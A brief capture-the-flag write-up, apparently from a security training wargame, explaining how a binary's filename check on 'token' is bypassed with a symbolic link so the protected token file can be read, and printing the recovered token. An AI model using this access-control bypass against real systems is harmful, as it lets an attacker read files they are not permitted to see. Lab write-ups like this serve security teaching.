When we started the level08, we can see two differents files:
- A binary called **level08**
- A file called **token**

We do not have the permissions to use token, and when executing **level07**, we got this:
```bash
./level08 [file to read]
```

When trying to place token as argument we got an error:
```bash
You may not access './token'
```

Using strings we can see that **level08** use strstr, probably to compare if the argument is called "token".

So going from that idea, we tryed making a SymLink using:

```bash
ln -s /home/user/level08/token /tmp/test
```

and then we do:
```bash
./level08 /tmp/test
```

and we got:
```
quif5eloekouj29ke0vouxean
```
We log to the user flag08 with the token and do getflag.